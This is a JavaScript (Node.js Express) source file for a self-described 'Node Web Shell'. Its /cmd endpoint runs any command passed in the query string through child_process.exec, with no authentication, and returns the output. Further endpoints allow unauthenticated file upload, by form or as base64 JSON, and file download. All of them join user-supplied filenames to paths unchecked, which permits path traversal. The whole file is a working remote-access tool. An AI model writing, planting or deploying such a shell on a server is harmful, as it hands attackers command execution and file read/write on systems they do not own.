const express = require('express');
const { exec } = require('child_process');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const port = 3000;
const uploadDir = path.join(__dirname, 'uploads');

// Ensure upload directory exists
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

const upload = multer({ dest: uploadDir });

// Add JSON body parser middleware
app.use(express.json({ limit: '50mb' }));

app.get('/', (req, res) => {
  res.send(`
    <h1>Node Web Shell</h1>
    <p>Run: <code>/cmd?c=whoami</code></p>
    <p>Upload (form-data): POST to <code>/upload</code> (form field: "file")</p>
    <p>Upload (JSON): POST to <code>/upload/json</code> with body: {"filename": "example.txt", "content": "base64string"}</p>
    <p>Download: <code>/download?f=filename</code></p>
  `);
});

app.get('/cmd', (req, res) => {
  const cmd = req.query.c;
  if (!cmd) return res.send('Missing command.');

  exec(cmd, (err, stdout, stderr) => {
    if (err) return res.send(`<pre>${stderr}</pre>`);
    res.send(`<pre>${stdout}</pre>`);
  });
});

app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.send('No file uploaded.');
  res.send(`Uploaded: ${req.file.originalname} as ${req.file.filename}`);
});

// New endpoint for JSON upload
app.post('/upload/json', (req, res) => {
  const { filename, content } = req.body;
  
  if (!filename || !content) {
    return res.status(400).send('Missing filename or content in JSON body');
  }

  try {
    const filepath = path.join(uploadDir, filename);
    const fileContent = Buffer.from(content, 'base64');
    fs.writeFileSync(filepath, fileContent);
    res.send(`Uploaded: ${filename}`);
  } catch (error) {
    res.status(500).send(`Error uploading file: ${error.message}`);
  }
});

app.get('/download', (req, res) => {
  const filename = req.query.f;
  if (!filename) return res.send('Missing ?f=filename');

  const filepath = path.join(uploadDir, filename);

  if (!fs.existsSync(filepath)) {
    return res.status(404).send('File not found.');
  }

  res.download(filepath, filename);
});

app.listen(port, () => {
  console.log(`Webshell ready on http://localhost:${port}`);
});
